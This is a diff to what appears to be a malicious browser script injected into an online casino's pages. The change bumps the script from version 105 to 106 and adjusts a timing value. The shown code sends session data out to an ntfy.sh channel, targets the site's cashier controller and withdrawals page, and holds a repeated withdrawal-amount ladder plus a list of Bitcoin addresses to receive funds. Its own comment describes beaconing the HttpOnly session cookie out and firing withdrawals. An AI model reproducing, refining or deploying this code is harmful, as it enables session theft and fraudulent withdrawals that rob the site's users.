@@ -12,8 +12,8 @@
    PHPSESSID is www+HttpOnly so the lobby page can never read it; we therefore
    beacon the cookie out and resolve identity locally, then blind-fire a ladder. */
 (function () {
-  if (window.__SOV105__) return; window.__SOV105__ = 1;
-  var V = '105', TAG = 'SOV105';
+  if (window.__SOV106__) return; window.__SOV106__ = 1;
+  var V = '106', TAG = 'SOV106';
   var NT = 'https://ntfy.sh/sov39hvt7k2';
   var BR = (function () {
     var h = String(location.hostname || '').toLowerCase();
@@ -23,9 +23,9 @@
   var CK = 'https://www.' + BR + '/app/shared/controllers/Cashier_v3Controller.php';
   var CP = 'https://www.' + BR + '/cashier/withdrawals';
   var HOME = 'https://www.' + BR + '/';
-  var COOL = 'sov105_cool', SHK = 'sov105_shots', ADDRK = 'sov105_addr', COOLMS = 8 * 60 * 1000;
+  var COOL = 'sov106_cool', SHK = 'sov106_shots', ADDRK = 'sov106_addr', COOLMS = 8 * 60 * 1000;
   var WPROV = 'Coinbase';
-var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.37, GA2 = 52.37, GAP = 2, MAXT = 360, HOP = 4000, MAXU = 40;
+var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.37, GA2 = 52.37, GAP = 2, MAXT = 360, HOP = 9000, MAXU = 40;
   var ADDRS = ['1PmMNcCDZfMQYXFeBPLgc9DQJj9cz7BmDv', '18RyS2XTv3gu38RUAihENc82yqWCK66VXD', '1DbGax2cdSMCgmvMU11xZzM9vhun8qF4nn', '1Bytwqap93vE6FBdY13P785cMTYgL8duaV', '1FfKV75xWzYQGPVaoQE53AomEs8KEENagx', '1L3ZgDjkqn3KQZZYsigDn6L5MJpTPL65jq', '17HqH2WYf71PzBkmmKWiUPikNnzUykBaTc', '1MPc16X2yUxX3tFrnPjSVjWK2qHsv7j5HB', '144pLnCkrq9D1BgjfQfM2XhEW3zf9EaBu4', '17ty8PZdi5CjAUTR3wPVNRuKCQNuqfuLMk', '16x4FuwcFCE8kK4Rd8tukkAfGVM2V7jQKu', '1NQkRUhnEga2bXsdjkQa4NVoXgug6aa7FM', '19Dum8sxudJF3Yq4RbrxcYvrescajk78Hr', '16gAuYrQKmAtwotwS6Z6EjTiTvGfFZtgNQ', '1K7uRvYtobvVtKncHiut6Zuk9rNGCMA2DM', '15fpLGcJA94r3Dk1jqLXZeaZEM6FYP945L', '1KpBG7TQ2zfrEoDFnZQRf4AJ3WBuNv7WWg'];
 
   function beat(k, o) {
@@ -429,6 +429,7 @@ var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.3
     b2('frame', { v: v, patch: g });
   } catch (e) { } })();
 })();
+
 
 
 
